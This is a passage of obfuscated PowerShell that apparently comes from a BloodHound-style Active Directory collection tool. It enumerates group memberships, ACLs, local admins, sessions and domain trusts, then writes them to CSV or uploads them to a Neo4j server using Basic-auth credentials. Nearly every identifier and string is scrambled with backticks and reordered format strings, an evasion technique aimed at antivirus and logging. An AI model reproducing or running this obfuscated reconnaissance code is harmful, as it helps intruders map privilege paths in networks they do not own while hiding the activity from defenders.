                ${c`sv`e`Xpo`RTp`RefiX} = "$($CSVPrefix)_"
            }
            else {
                ${CSV`Ex`P`Ort`pR`Efix} = ''
            }

            &("{1}{0}{2}"-f'p','Write-Out','ut') ('W'+'r'+'iting '+'outp'+'ut '+'to'+' '+'CS'+'Vs '+'in'+': '+"$OutputFolder\$CSVExportPrefix")

            if(${UsES`e`sSi`On} -or ${u`sEL`O`GgedOn}) {
                ${sE`ss`ionPa`TH} = "$OutputFolder\$($CSVExportPrefix)user_sessions.csv"
                ${ex`i`sts} =  (  &("{0}{2}{3}{4}{1}"-f 'gEt-CH','m','I','lDi','TE') ('V'+'ArIaBle:NW2'+'B')  )."Va`lUE"::("{0}{1}"-f'Exist','s').Invoke(${SE`SsiO`Np`Ath})
                ${sESsIoN`FI`LES`Tre`Am} = &("{2}{0}{1}"-f'ew-Ob','ject','N') ("{0}{2}{1}" -f 'IO.F','leStream','i')(${s`esSI`on`PaTh},  ${JH4`85}::"apP`eND",  ${n`3Wx7M}::"w`RITe",   ${NZ`G7}::"rE`AD")
                ${SeSSi`Onw`R`ITeR} = &("{2}{0}{1}"-f 'b','ject','New-O') ("{2}{1}{0}{5}{6}{3}{4}"-f 'te','s','Sy','eamWri','ter','m.IO','.Str')(${SE`s`s`IONFiLe`streAM})
                ${S`e`SSI`OnwR`iTeR}."A`UtOf`LuSH" = ${t`RUE}
                if (-not ${EXI`sts}) {
                    
                    ${Se`sSION`wrI`TEr}.("{0}{2}{1}"-f 'Wri','e','teLin').Invoke(((("{10}{5}{2}{1}{3}{4}{12}{8}{9}{13}{7}{0}{11}{6}"-f 'ei','uterName{0},{','Comp','0}','U','}','ht{0}','}W','e','rName{0}','{0','g','s',',{0')) -F [CHaR]34))
                }
            }

            if(${uSeg`RO`Up}) {
                ${Grou`Pp`A`TH} = "$OutputFolder\$($CSVExportPrefix)group_memberships.csv"
                ${ex`is`Ts} =  ${Nw`2b}::("{0}{1}" -f'Ex','ists').Invoke(${GRo`UP`P`AtH})
                ${Grou`Pfi`L`eStrE`Am} = &("{1}{2}{0}"-f 'Object','N','ew-') ("{2}{1}{0}" -f 'eStream','O.Fil','I')(${GroUP`PA`TH},   ( &('Ls')  ('v'+'ARiaB'+'L'+'E:'+'jH485'))."Va`luE"::"Ap`PenD",  ${n`3wX7M}::"wRI`TE",  (&("{0}{1}" -f'dI','R') ('vA'+'R'+'iAb'+'le:NZg7'))."VAl`Ue"::"re`Ad")
                ${gR`OuPW`RI`TeR} = &("{0}{2}{1}"-f 'New-O','ject','b') ("{0}{1}{2}{4}{3}"-f'System.','IO','.S','eamWriter','tr')(${GRO`UP`F`ILestrE`AM})
                ${gRoUP`w`R`iter}."aUT`O`FLu`sH" = ${Tr`Ue}
                if (-not ${eX`IS`Ts}) {
                    
                    ${gR`OUPw`RitEr}.("{2}{1}{3}{0}" -f'ine','i','Wr','teL').Invoke(((("{4}{10}{5}{13}{2}{7}{6}{3}{12}{11}{0}{9}{8}{1}{14}"-f '1N','tTypee','pNa','N','e','Gro',',e1','mee1N','ccoun','A','1N','1N,e','AccountNamee','u','1N'))."re`pl`ACE"(([Char]101+[Char]49+[Char]78),[strInG][Char]34)))
                }
            }

            if(${uSEac`LS}) {
                ${aCL`pa`TH} = "$OutputFolder\$($CSVExportPrefix)acls.csv"
                ${E`XI`stS} =  (  &("{2}{4}{0}{1}{3}" -f'i','T','GEt-ChIl','eM','d')  variABLe:nw2b )."Va`lUe"::("{0}{1}" -f 'Exi','sts').Invoke(${AcL`p`AtH})
                ${AC`Lfi`lest`R`eam} = &("{2}{0}{1}" -f'c','t','New-Obje') ("{0}{1}{2}"-f 'IO.FileSt','re','am')(${a`cLP`ATh},   ${JH`4`85}::"A`ppENd",   (&("{1}{2}{0}"-f'Em','c','hIlDit')  varIAblE:N3wx7M)."v`ALUE"::"WRI`TE",  (&("{0}{1}"-f 'd','Ir') VariAble:nZg7  )."V`AluE"::"Re`AD")
                ${ACLWr`It`Er} = &("{1}{0}{2}"-f'w-O','Ne','bject') ("{4}{0}{2}{1}{5}{3}"-f 'y','em.I','st','reamWriter','S','O.St')(${Ac`LfILEs`TrEAM})
                ${Ac`lWriT`ER}."aU`TOfl`USH" = ${Tr`UE}
                if (-not ${E`xI`STs}) {
                    
                    ${ACl`WRI`TeR}.("{1}{2}{0}"-f'ine','W','riteL').Invoke(((("{11}{20}{37}{16}{6}{10}{4}{22}{15}{27}{9}{1}{29}{14}{17}{18}{2}{24}{36}{26}{25}{13}{31}{3}{30}{23}{0}{12}{38}{33}{32}{28}{34}{7}{35}{8}{19}{5}{21}" -f'Rights{0},','},','alType{','eDi','e{0','trolType{0},{0}IsInherit','je','c','essCo','ipalName{0','ctTyp','{0','{','}Ac','}P','0}Pr','0},{0}Ob','rin','cip','n','}Object','ed{0}','},{','ctory','0}','0','{','inc','},','{0','re','tiv','Type{0','ACE','{0}A','c',',','Name{','0}'))  -F[Char]34))
                }
            }

            if(${U`sEl`OcALGR`o`UP} -or ${us`Eg`POgro`Up}) {
                ${loc`A`la`D`MiNPaTH} = "$OutputFolder\$($CSVExportPrefix)local_admins.csv"
                ${ExI`s`Ts} =   ${Nw`2b}::("{2}{1}{0}" -f 's','xist','E').Invoke(${loC`AL`A`dmi`NPATH})
                ${lO`CALaDmIn`File`sTrE`AM} = &("{0}{2}{1}"-f'New','ct','-Obje') ("{0}{2}{1}" -f 'IO.Fil','eam','eStr')(${LOcala`d`mI`N`pAth},   (&('gI')  VARiabLE:jH485 )."VAl`Ue"::"a`ppENd",   ${N`3W`x7m}::"wR`ite",  (  &("{2}{1}{4}{0}{3}" -f 'hIL','Et-','g','DITem','C') ("V"+"ariaBlE:Nz"+"g7"))."vA`lUE"::"RE`Ad")
                ${loca`LAd`M`iNWrITeR} = &("{2}{0}{1}"-f'w','-Object','Ne') ("{2}{1}{4}{3}{0}" -f 'riter','yste','S','amW','m.IO.Stre')(${lOCaLAd`minf`ILE`S`TREAm})
                ${L`oc`A`l`ADMiNw`RiTEr}."A`UTof`LuSh" = ${T`RUE}
                if (-not ${e`X`ists}) {
                    
                    ${L`oCaLA`D`MINwR`iteR}.("{1}{0}{2}"-f't','Wri','eLine').Invoke(((("{8}{4}{3}{5}{1}{0}{10}{9}{2}{7}{6}"-f'J','countName','T','erN','Comput','ameJ5x,J5xAc','eJ5x','yp','J5x',',J5xAccount','5x'))  -REPLacE 'J5x',[cHar]34))
                }
            }

            if(${US`ED`Oma`InTR`USTs}) {
                ${truSt`s`pA`Th} = "$OutputFolder\$($CSVExportPrefix)trusts.csv"
                ${exis`Ts} =   (&("{3}{2}{0}{1}"-f 'RIab','le','A','gEt-V')  ('NW2'+'b') -vAlUe)::("{1}{0}"-f 's','Exist').Invoke(${tRU`stSPa`Th})
                ${tR`U`STSFI`L`ESTreAm} = &("{0}{1}{2}"-f'New','-O','bject') ("{2}{0}{1}" -f 'leS','tream','IO.Fi')(${trU`st`SPA`Th},   ( &('gI')  VaRIABlE:jH485)."v`ALue"::"APP`e`ND",   (&("{0}{2}{1}" -f'c','eM','HIldit')  ("vAr"+"IAbLE:"+"N3W"+"x7m") )."va`LUE"::"WrI`TE",   ${N`zg7}::"rE`AD")
                ${Tr`U`Stwr`ItEr} = &("{1}{2}{0}"-f't','New-O','bjec') ("{2}{0}{4}{3}{1}" -f 'ste','ter','Sy','Wri','m.IO.Stream')(${T`Ru`STSfil`E`StrE`Am})
                ${T`RuSTWr`i`Ter}."AUT`o`FlusH" = ${T`Rue}
                if (-not ${EX`is`Ts}) {
                    
                    ${tRUstw`Rit`ER}.("{2}{1}{0}"-f 'teLine','i','Wr').Invoke(((("{8}{15}{3}{14}{10}{18}{6}{11}{16}{4}{17}{2}{20}{7}{5}{12}{9}{13}{0}{1}{19}" -f 'rans','itiveVR','rect','zS','r','z,','m','nVR','V','RzTrustTy','ceDo','ainV','V','peVRz,VRzT','our','R','Rz,VRzT','ustDi','mainVRz,VRzTargetDo','z','io')) -rEPlACE  ([CHAR]86+[CHAR]82+[CHAR]122),[CHAR]34))
                }
            }
        }

        else {
            
            ${WE`BcL`iE`Nt} = &("{0}{2}{1}" -f'Ne','t','w-Objec') ("{5}{3}{4}{1}{0}{2}"-f'lie','et.WebC','nt','.','N','System')

            ${baSE`64uSer`P`ASS} =  ( &("{1}{0}" -f'TEm','I')  ('var'+'i'+'AB'+'le:Gk8') )."v`AluE"::"T`Ob`Ase64St`RinG"(  (&("{0}{2}{1}" -f 'VaRia','E','BL')  yDpel )."v`ALUE"::"Ut`F8".("{1}{2}{0}" -f'ytes','Get','B').Invoke(${uS`e`RPASS}))

            
            ${wEbCL`iE`NT}."H`EaD`ERs".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}" -f 't','Accep'),("{4}{1}{0}{5}{3}{2}" -f'ication/jso','l','TF-8','rset=U','app','n; cha'))
            ${w`eBClI`eNT}."HeADe`Rs".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f'Aut','h','orization'),('B'+'a'+'sic '+"$Base64UserPass"))

            
            try {
                ${n`ULL} = ${W`E`BClie`NT}.("{0}{2}{1}"-f 'Do','oadString','wnl').Invoke(${u`RI}."AB`solut`E`UrI" + ("{1}{0}{2}"-f 'er/ne','us','o4j'))
                &("{0}{3}{2}{1}"-f'Writ','e','os','e-Verb') "Connection established with neo4j ingestion interface at $($URI.AbsoluteUri) "
                ${a`UThOR`iz`ed} = ${tr`Ue}
            }
            catch {
                ${AUt`hO`RI`zEd} = ${Fa`lsE}
                throw "Error connecting to Neo4j rest REST server at '$($URI.AbsoluteUri)' "
            }

            &("{2}{1}{3}{0}" -f't','-Outp','Write','u') "Sending output to neo4j RESTful API interface at: $($URI.AbsoluteUri) "

            ${Nu`Ll} =   (  &("{0}{1}" -f'IT','EM')  VAriabLE:c2akq  )."v`ALuE"::("{0}{3}{5}{2}{4}{1}" -f'Loa','ialName','hP','dW','art','it').Invoke(("{4}{2}{1}{0}{3}" -f 's','n','ystem.Web.Exte','ions','S'))

            
            function COnvERtT`O-JS`ON20([object] ${it`eM}){
                ${ps`_`jS} = &("{2}{0}{1}" -f '-O','bject','New') ("{4}{12}{2}{9}{11}{1}{7}{8}{0}{5}{6}{10}{3}" -f 'S','scri','tion.','er','System.Web.Script','eri','al','p','t','ja','iz','va','.Serializa')
                return ${pS`_jS}.("{1}{0}{2}"-f 'a','Seri','lize').Invoke(${i`TEm})
            }

            ${A`UTHoR`iZed} = ${T`RuE}
            ${st`AT`eMEn`Ts} = &("{1}{3}{0}{2}" -f'je','New','ct','-Ob') ("{0}{1}{4}{5}{3}{2}" -f 'System.Col','lec','t','s','tion','s.ArrayLi')

            
            ${N`ULl} = ${ST`A`TEMe`NTs}.("{1}{0}"-f 'd','Ad').Invoke( @{ ("{0}{1}{2}"-f's','tatem','ent')=("{1}{9}{6}{7}{5}{8}{3}{0}{4}{2}" -f 'e','CREAT','IQUE','m',' IS UN','N','ASS','ERT c.User','a','E CONSTRAINT ON (c:User) ') } )
            ${Nu`LL} = ${St`AtE`m`ENts}.("{1}{0}"-f 'd','Ad').Invoke( @{ ("{1}{2}{0}"-f'nt','s','tateme')=(("{9}{1}{3}{4}{6}{16}{15}{0}{13}{12}{5}{8}{11}{14}{2}{7}{10}"-f')','REAT','S','E CONSTRA','INT ON ','Computer','(c:Compu',' ','N','C','UNIQUE','a','SSERT c.',' A','me I','er','t'))} )
            ${nU`Ll} = ${STAT`Eme`NTS}.("{0}{1}"-f'A','dd').Invoke( @{ ("{2}{1}{0}{3}" -f 'en','tem','sta','t')=("{7}{5}{9}{0}{1}{8}{3}{2}{4}{6}" -f'TRAINT ON (c',':','RT c.G','ASSE','roupName IS U','CO','NIQUE','CREATE ','Group) ','NS') } )
            ${jS`ON} = @{ ("{0}{1}{2}"-f'statem','en','ts')=[System.Collections.Hashtable[]]${S`T`ATEmEnTs} }
            ${jso`NrE`qUest} = &("{2}{3}{0}{1}"-f'on','20','C','onvertTo-Js') ${jS`ON}
            ${nu`Ll} = ${WEb`CliE`NT}.("{3}{0}{2}{1}" -f'loadS','ng','tri','Up').Invoke(${U`RI}."a`B`SoLUteurI" + ("{0}{7}{1}{2}{3}{4}{5}{6}" -f'd','data','/transa','ction/','co','mm','it','b/'), ${JSon`REquE`st})
            ${sT`A`TeMents}.("{0}{1}" -f 'Cl','ear').Invoke()
        }

        ${UsE`Rdo`mAInM`APPi`NgS} = @{}
        if(-not ${skI`pgcdeco`Nfl`i`C`TIO`N2}) {
            
            
            if(${PSBoun`d`p`Ar`AMETeRS}[("{1}{2}{3}{0}"-f 'atalog','Glob','a','lC')]) {
                ${U`seRDomA`InM`APpI`N`gS} = &("{4}{0}{2}{1}{3}" -f'obalCatalogUser','pin','Map','g','Get-Gl') -GlobalCatalog ${G`LobA`LCataL`Og}
            }
            else {
                ${u`Ser`dOMA`INmap`PI`Ngs} = &("{2}{3}{1}{4}{0}"-f'g','alog','Get','-GlobalCat','UserMappin')
            }
        }
        ${dOma`iN`S`H`Ort`Na`mEmaPPingS} = @{}

        if(${D`oMA`In}) {
            ${T`ArGEt`DO`mAInS} = @(${Do`Ma`in})
        }
        elseif(${seAr`C`hfoREST}) {
            
            ${taR`GeTdo`M`AiNS} = &("{5}{1}{3}{0}{2}{4}"-f'tD','et-','o','NetFores','main','G') | &("{1}{0}{2}" -f 'ct-O','Sele','bject') -ExpandProperty ("{0}{1}"-f'Nam','e')
        }
        else {
            
            ${TA`RG`et`dOma`iNs} = @( (&("{1}{0}{2}" -f'Dom','Get-Net','ain'))."n`Ame" )
        }

        if(${U`Se`Gr`OUP} -and ${Ta`RgEtDOmaI`NS}) {
            ${ti`T`Le} = (&("{1}{0}{2}"-f 'et-Cu','G','lture'))."t`Ex`TINFO"
            ForEach (${T`AR`g`eT`DoMain} in ${TA`RGE`TDOMa`INS}) {
                
                &("{2}{3}{0}{1}{4}"-f 'rb','o','Wri','te-Ve','se') ('En'+'ume'+'r'+'ating '+'grou'+'p '+'mem'+'b'+'ersh'+'ips '+'fo'+'r '+'dom'+'ain'+' '+"$TargetDomain")

                
                ${g`R`ouPD`NMAPP`i`NGS} = @{}
                ${pRi`m`ARygro`UPS} = @{}
                ${d`O`MaiN`sID} = &("{3}{1}{2}{0}" -f 'omainSID','t','-D','Ge') -Domain ${Targ`ETdO`maIn} -DomainController ${d`omAi`Nc`oNTroLLEr}

                ${o`BJE`CtSe`Arc`Her} = &("{0}{3}{2}{4}{1}"-f 'Get-Doma','r','a','inSe','rche') -Domain ${TARG`eTD`o`MAiN} -DomainController ${d`oMaINCOnt`R`O`llEr} -ADSPath ${usERAD`S`pA`Th}
                
                ${ob`Jec`T`SEaR`cHER}."FI`LTEr" = (("{1}{2}{0}"-f 'of=*)','(mem','ber'))
                
                ${N`ULL} = ${ObJECT`seARCh`ER}."p`RopeRTi`esto`lo`Ad".("{1}{2}{0}" -f 'Range','Ad','d').Invoke((("{2}{3}{1}{0}" -f'ntname','u','sa','macco'), ("{1}{3}{2}{0}{5}{4}"-f 'ed','di','sh','stingui','ame','n'), 'cn', ("{2}{0}{1}{3}" -f 'st','n','dnsho','ame'), ("{0}{2}{3}{1}" -f's','e','am','accounttyp'), ("{0}{3}{4}{2}{1}"-f'prima','d','groupi','r','y'), ("{0}{1}" -f 'memb','erof')))
                ${C`ou`NtEr} = 0
                ${O`BjeCt`sEarC`HEr}.("{1}{0}" -f 'll','FindA').Invoke() | &("{3}{0}{1}{2}"-f'h-O','bj','ect','ForEac') {
                    if(${CoUN`T`er} % 1000 -eq 0) {
                        &("{0}{2}{3}{1}{4}" -f 'W','t','r','i','e-Verbose') ('Grou'+'p'+' '+'o'+'bj'+'ect '+'count'+'er:'+' '+"$Counter")
                        if(${g`RO`UPwritER}) {
                            ${gR`Ou`PW`RitEr}.("{0}{1}" -f'Fl','ush').Invoke()
                        }
                         ${Q`cf0`Z6}::("{0}{1}"-f 'Colle','ct').Invoke()
                    }
                    ${P`R`OPer`Ties} = ${_}."p`RoPErtI`eS"

                    ${MEmb`ER`Dn} = ${nU`ll}
                    ${m`eMbERdom`Ain} = ${n`UlL}
                    try {
                        ${Mem`B`erdn} = ${PrOpE`R`Ties}[("{3}{0}{2}{1}" -f'stingu','edname','ish','di')][0]

                        if ((${m`embeR`Dn} -match ("{4}{3}{0}{2}{6}{1}{5}" -f 'S','i','ecu','n','Foreig','ncipals','rityPr')) -and (${ME`MBe`RDN} -match ("{1}{0}"-f '-5-21','S-1'))) {
                            try {
                                if(-not ${m`e`mbErsiD}) {
                                    ${meMB`E`Rsid} = ${pRo`peR`T`IES}."c`N"[0]
                                }
                                ${Me`m`B`ERsimpL`ENaME} = &("{4}{1}{0}{3}{2}" -f'-S','nvert','me','idToNa','Co') -SID ${Me`mBe`RsiD} | &("{2}{0}{1}{3}"-f '-AD','Na','Convert','me') -InputType 'NT4' -OutputType ("{1}{2}{0}"-f 'l','Canon','ica')
                                if(${MEmBeRsImp`Le`N`AMe}) {
                                    ${m`E`mBe`RdoMaIn} = ${MEMb`Er`SI`m`pleN`AmE}.("{1}{0}"-f 'lit','Sp').Invoke('/')[0]
                                }
                                else {
                                    &("{2}{3}{0}{1}" -f '-V','erbose','W','rite') ('Err'+'or '+'conve'+'rt'+'ing '+"$MemberDN")
                                }
                            }
                            catch {
                                &("{0}{1}{2}{3}" -f'Wri','t','e-V','erbose') ('Err'+'or '+'con'+'verting'+' '+"$MemberDN")
                            }
                        }
                        else {
                            
                            ${mEMb`ERDOmA`IN} = ${M`eMBE`RDN}.("{1}{2}{0}"-f 'bString','s','u').Invoke(${MEm`Be`Rdn}.("{1}{2}{0}"-f 'f','Inde','xO').Invoke("DC=")) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {}

                    if (@(("{1}{2}{0}"-f'35456','2','684'),("{0}{2}{1}"-f'26','435457','8'),("{1}{2}{0}" -f'2','5368709','1'),("{2}{1}{0}" -f'913','0','53687')) -contains ${pr`opERt`iEs}[("{1}{2}{0}" -f 'type','samaccou','nt')]) {
                        ${oBJ`eCtT`Ype} = ("{0}{1}" -f 'grou','p')
                        if(${pr`opE`RTieS}[("{1}{0}{3}{2}"-f'ccou','sama','ame','ntn')]) {
                            ${m`emBEr`Na`ME} = ${prOP`ERti`Es}[("{3}{1}{2}{0}" -f'e','nt','nam','samaccou')][0]
                        }
                        else {
                            
                            try {
                                ${MeM`Berna`Me} = &("{1}{5}{4}{3}{0}{2}" -f 'oNam','Conv','e','dT','Si','ert-') ${pRo`perTi`es}['cn'][0]
                            }
                            catch {
                                
                                ${M`Emb`er`NAME} = ${prOp`er`TIes}['cn'][0]
                            }
                        }
                        if (${MeMb`ER`NAmE} -Match "\\") {
                            
                            
                            ${acCO`Untn`AMe} = ${m`eM`BeRnA`ME}.("{0}{1}" -f 'spli','t').Invoke('\')[1] + '@' + ${M`EMB`ERDOM`AIN}
                        }
                        else {
                            ${AC`c`o`UNTnAMe} = "$MemberName@$MemberDomain"
                        }
                    }
                    elseif (@(("{1}{0}{2}"-f '0','8','5306369')) -contains ${prOPE`R`TI`eS}[("{1}{2}{0}" -f'e','s','amaccounttyp')]) {
                        ${OBJEC`TT`y`PE} = ("{1}{2}{0}" -f 'uter','c','omp')
                        if (${p`ROpE`Rt`IEs}[("{2}{1}{0}" -f 'ame','n','dnshost')]) {
                            ${aC`C`OUnTnAME} = ${pr`OPE`R`Ties}[("{2}{1}{0}{3}"-f 't','s','dnsho','name')][0]
                        }
                    }
                    elseif (@(("{2}{0}{1}" -f'3','68','805306')) -contains ${PR`oP`E`RtIeS}[("{1}{0}{2}{3}"-f'count','samac','t','ype')]) {
                        ${ob`jECttY`pe} = ("{1}{0}"-f'er','us')
                        if(${PROp`e`Rt`iEs}[("{0}{4}{3}{1}{2}" -f's','ountna','me','macc','a')]) {
                            ${m`emb`ERN`AME} = ${PR`OP`ErT`ies}[("{2}{0}{1}" -f'tn','ame','samaccoun')][0]
                        }
                        else {
                            
                            try {
                                ${M`em`BeRNamE} = &("{0}{1}{2}{3}" -f'Con','vert-SidTo','N','ame') ${pRop`ErT`iES}['cn'][0]
                            }
                            catch {
                                
                                ${Me`M`BEr`NAMe} = ${pr`oP`ERTI`Es}['cn'][0]
                            }
                        }
                        if (${MEM`BE`Rn`AmE} -Match "\\") {
                            
                            
                            ${A`ccou`NTn`Ame} = ${MeMB`E`Rna`mE}.("{1}{0}"-f'it','spl').Invoke('\')[1] + '@' + ${m`EmBE`Rdo`m`AiN}
                        }
                        else {
                            ${acCo`U`N`TNAmE} = "$MemberName@$MemberDomain"
                        }
                    }
                    else {
                        &("{3}{2}{4}{0}{1}"-f 'os','e','r','Write-Ve','b') "Unknown account type for object $($Properties['distinguishedname']) : $($Properties['samaccounttype']) "
                    }

                    if(${ACc`OuNtNa`ME} -and (-not ${A`CCoU`Nt`NaME}.("{2}{0}{1}" -f'tarts','With','S').Invoke('@'))) {

                        
                        ${mEMBErp`RiM`AR`Y`Groupn`AMe} = ${n`Ull}
                        try {
                            if(${ACCoUntn`A`Me} -match ${TAr`GEtD`oM`AiN}) {
                                
                                if(${p`ROPert`IEs}[("{3}{0}{2}{1}" -f 'p','d','i','primarygrou')] -and ${pRo`P`eR`TiES}[("{4}{2}{3}{0}{1}" -f'ar','ygroupid','ri','m','p')][0] -and (${P`RopE`RtIEs}[("{1}{2}{0}"-f'id','primarygrou','p')][0] -ne '')) {
                                    ${p`RIm`ArY`grOupsid} = "$DomainSID-$($Properties['primarygroupid'][0])"
                                    
                                    if(${PRI`mAR`Y`GrO`Ups}[${p`RImA`Ry`gROUps`ID}]) {
                                        ${Pr`iMArYGRoU`p`Na`me} = ${prima`RYgRO`U`ps}[${P`RiM`AryG`ROupsID}]
                                    }
                                    else {
                                        ${RaWnA`mE} = &("{0}{3}{1}{2}"-f 'Con','idT','oName','vert-S') -SID ${pRiMar`ygrOu`ps`iD}
                                        if (${r`AWN`Ame} -notmatch ("{2}{1}{0}" -f'-.*','1','^S-')) {
                                            ${pR`imaR`YgrOUpN`A`Me} = ${Rawn`A`me}.("{0}{1}"-f 's','plit').Invoke('\')[-1]
                                            ${PrIm`A`R`ygROuPs}[${p`RiMARYgRO`UP`s`ID}] = ${Pri`M`ARYGRouP`N`A`ME}
                                        }
                                    }
                                    if (${PR`ima`Ry`gROupNAMe}) {
                                        ${MEmB`ErP`RI`mARY`gr`OUPNa`ME} = "$PrimaryGroupName@$TargetDomain"
                                    }
                                }
                                else { }
                            }
                        }
                        catch { }

                        if(${M`EmBErPRi`M`ArYGrOUpN`Ame}) {
                            
                            if (${PscmD`let}.pArAmeTerseTNAme -eq ("{1}{0}"-f 't','CSVExpor')) {
                                ${g`R`OUp`wRiTEr}.("{0}{2}{1}{3}"-f 'Wr','e','it','Line').Invoke("`"$MemberPrimaryGroupName`",`"$AccountName`",`"$ObjectType`"")
                            }
                            else {
                                ${OB`JE`C`TTYPECap} = ${T`Itle}.("{2}{3}{0}{1}" -f 'tl','eCase','To','Ti').Invoke(${o`BjeCtTY`Pe})
                                ${Nu`ll} = ${sT`AtEMe`NTs}.("{1}{0}" -f'd','Ad').Invoke( @{ ("{1}{2}{3}{0}" -f 't','stat','em','en')="MERGE ($($ObjectType)1:$ObjectTypeCap { name: UPPER('$AccountName') }) MERGE (group2:Group { name: UPPER('$MemberPrimaryGroupName') }) MERGE ($($ObjectType)1)-[:MemberOf]->(group2)" } )
                            }
                        }

                        
                        ForEach(${g`R`OupDn} in ${_}."prOp`eRt`Ies"[("{1}{2}{0}"-f'f','memb','ero')]) {
                            ${gr`OUpDOm`A`IN} = ${GRoUp`dn}.("{2}{1}{0}" -f 'g','n','subStri').Invoke(${GRoU`p`Dn}.("{0}{2}{1}" -f'Ind','xOf','e').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

                            if(${groUp`dn`MAppI`NGs}[${gr`o`UpdN}]) {
                                ${GR`O`UpNAmE} = ${GROupDn`m`A`ppI`NgS}[${gr`OuP`dN}]
                            }
                            else {
                                ${Gro`Upn`AMe} = &("{4}{2}{1}{3}{0}" -f'e','D','rt-A','Nam','Conve') -ObjectName ${Gr`o`UpdN}
                                if(${G`RouPN`AME}) {
                                    ${g`RO`UPname} = ${gRo`UP`NAme}.("{1}{0}"-f't','Spli').Invoke('\')[-1]
                                }
                                else {
                                    ${gr`oUPn`A`mE} = ${g`R`oupDN}.("{0}{2}{1}"-f'SubS','ng','tri').Invoke(0, ${G`RoUp`dN}.("{0}{1}" -f'I','ndexOf').Invoke(',')).("{0}{1}"-f'S','plit').Invoke('=')[-1]
                                }
                                ${GrOU`p`dnmAp`pINgs}[${G`Rou`pDN}] = ${Gr`O`UPNAme}
                            }

                            if (${PSC`mDL`Et}.PaRAmetERSeTnAme -eq ("{1}{0}{2}" -f'Ex','CSV','port')) {
                                ${gRoup`wRI`TeR}.("{2}{0}{1}" -f'teL','ine','Wri').Invoke("`"$GroupName@$GroupDomain`",`"$AccountName`",`"$ObjectType`"")
                            }
                            else {
                                
                                ${oBj`e`CTt`ypEcap} = ${t`i`TlE}.("{1}{2}{3}{0}"-f 'e','To','Titl','eCas').Invoke(${o`Bjec`TTYpe})

                                ${nu`LL} = ${S`T`ATem`EntS}.("{1}{0}" -f'dd','A').Invoke( @{ ("{2}{0}{1}" -f 'te','ment','sta')="MERGE ($($ObjectType)1:$ObjectTypeCap { name: UPPER('$AccountName') }) MERGE (group2:Group { name: UPPER('$GroupName@$GroupDomain') }) MERGE ($($ObjectType)1)-[:MemberOf]->(group2)" } )

                                if (${STa`TE`Men`TS}."c`Ount" -ge ${thrOT`T`Le}) {
                                    ${js`oN} = @{ ("{0}{2}{1}"-f 'sta','ts','temen')=[System.Collections.Hashtable[]]${sTA`TEME`NTS} }
                                    ${JsoNrE`qUe`ST} = &("{0}{3}{1}{2}"-f'ConvertT','on','20','o-Js') ${Js`oN}
                                    ${NU`Ll} = ${We`B`cl`Ient}.("{2}{0}{1}" -f 'dStrin','g','Uploa').Invoke(${u`Ri}."AbSoL`UT`Eu`RI" + ("{5}{3}{4}{0}{7}{2}{6}{1}" -f '/tra','it','n','at','a','db/d','/comm','nsactio'), ${Jso`N`ReQue`st})
                                    ${S`T`AtemeNTS}.("{0}{1}"-f'Cl','ear').Invoke()
                                }
                            }
                        }
                        ${coU`N`Ter} += 1
                    }
                }
                ${ob`JEc`TSE`ARCHEr}.("{2}{0}{1}"-f 's','pose','Di').Invoke()

                if (${Ps`c`MdLEt}.PAraMeteRSETNaME -eq ("{1}{0}" -f 'STAPI','RE')) {
                    ${j`SON} = @{ ("{1}{2}{0}"-f 's','sta','tement')=[System.Collections.Hashtable[]]${STA`TemE`N`Ts} }
                    ${j`SO`NrEQUE`sT} = &("{1}{0}{3}{2}"-f '-Js','ConvertTo','n20','o') ${Js`On}
                    ${n`ULl} = ${we`BClIe`Nt}.("{0}{2}{1}" -f 'Up','tring','loadS').Invoke(${U`RI}."aBSOl`UT`EUrI" + ("{6}{1}{2}{3}{0}{4}{7}{5}"-f'ction/c','data/t','rans','a','o','mit','db/','m'), ${JSonR`e`qUe`sT})
                    ${sTat`eme`NTS}.("{0}{1}"-f 'C','lear').Invoke()
                }
                &("{2}{0}{1}{3}" -f'e','-Verb','Writ','ose') ('D'+'one '+'wit'+'h '+'g'+'roup '+'en'+'umer'+'a'+'tion '+'fo'+'r '+'d'+'om'+'ain '+"$TargetDomain")
            }
             ${Q`cf0z6}::("{1}{0}" -f 'ct','Colle').Invoke()
        }

        if(${usE`A`ClS} -and ${T`ARGETD`OMai`NS}) {

            
            ${p`R`i`NCipalmAPpi`Ng} = @{}
            ${cO`UN`TER} = 0

            
            ${co`mMonSi`DMap`PI`Ng} = @{
                ("{1}{0}" -f'1-0','S-')         = @(("{3}{0}{2}{4}{1}" -f 'ull A','ty','uthor','N','i'), ("{0}{1}" -f'USE','R'))
                ("{1}{0}{2}"-f'-1','S','-0-0')       = @(("{1}{0}"-f 'dy','Nobo'), ("{1}{0}" -f 'R','USE'))
                ("{0}{1}" -f'S-1-','1')         = @(("{1}{2}{0}{3}"-f 'd A','Wo','rl','uthority'), ("{0}{1}"-f'U','SER'))
                ("{1}{0}" -f'-0','S-1-1')       = @(("{1}{0}"-f 'yone','Ever'), ("{1}{0}"-f'UP','GRO'))
                ("{0}{1}"-f'S','-1-2')         = @(("{0}{1}{2}{3}" -f'Local Au','thor','it','y'), ("{0}{1}" -f 'USE','R'))
                ("{0}{1}"-f 'S-1','-2-0')       = @(("{1}{0}" -f'l','Loca'), ("{1}{0}" -f 'P','GROU'))
                ("{2}{1}{0}"-f '1','-2-','S-1')       = @(("{2}{0}{1}"-f'sole ','Logon','Con'), ("{1}{0}"-f'UP','GRO'))
                ("{1}{0}"-f '-3','S-1')         = @(("{0}{1}{2}{3}"-f'Crea','t','or Aut','hority'), ("{0}{1}"-f 'US','ER'))
                ("{1}{0}{2}" -f'-1-3-','S','0')       = @(("{2}{1}{0}" -f 'er','reator Own','C'), ("{1}{0}"-f 'SER','U'))
                ("{0}{1}" -f 'S-1-3','-1')       = @(("{0}{3}{1}{2}"-f 'C','eator Grou','p','r'), ("{0}{1}" -f'G','ROUP'))
                ("{1}{2}{0}"-f'3-2','S-','1-')       = @(("{1}{2}{3}{0}{4}"-f 'rve','Cr','eator',' Owner Se','r'), ("{0}{1}"-f 'COMPUT','ER'))
                ("{0}{1}" -f'S-1-3','-3')       = @(("{4}{2}{0}{5}{1}{3}"-f 'tor Gr','p','rea',' Server','C','ou'), ("{0}{1}"-f 'COMPUT','ER'))
                ("{2}{1}{0}"-f '-4','3','S-1-')       = @(("{3}{1}{0}{2}" -f 'r Right','ne','s','Ow'), ("{0}{1}" -f 'G','ROUP'))
